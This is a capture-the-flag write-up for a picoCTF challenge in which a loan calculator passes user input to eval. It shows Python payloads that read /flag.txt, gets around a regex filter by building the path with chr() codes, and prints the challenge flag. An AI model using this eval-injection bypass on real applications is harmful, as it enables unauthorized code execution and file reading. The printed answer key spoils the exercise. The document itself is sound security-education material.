## Challenge
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?

**Hint 1:** Bypass regex\
**Hint 2:** The flag file is `/flag.txt`\
**Hint 3:** You might need encoding or dynamic construction to bypass restrictions.

### Solve
**Flag:** `picoCTF{D0nt_Use_Unsecure_f@nctions5e20166b}`
- I tried brute-forcing to read the flag by typing `open("/flag.txt").read()` but it displayed a warning saying `Error: Detected forbidden keyword '.'`.
- To make sure which `.` it is talking about, I ran the command `open("flag").read()`.
- After running the above command, I got other warning saying: `Result: Error: [Errno 2] No such file or directory: 'flag'`.
- Also, running the command: `open("/flag").read()` raises the same **forbidden keyword** error.
- This confirms that we need to pass the string `/flag.txt` in such a way that it bypasses the **regex**(regular expression).
- There are two problem characters in the payload `open("/flag.txt").read()` which prevents us from getting the flag directly:
    - `/`
    - `.`
- Thus, I tried passing their **ASCII** values to bypass the regex with the command `open(chr(47)+"flag"+chr(46)+"txt").read()` which utlimately revealed the flag.


### New Learnings
- Bypass regex based filters using ASCII encoding.
- Follow secure coding habits and conventions.
- Security filters alone are not enough to prevent attacks.
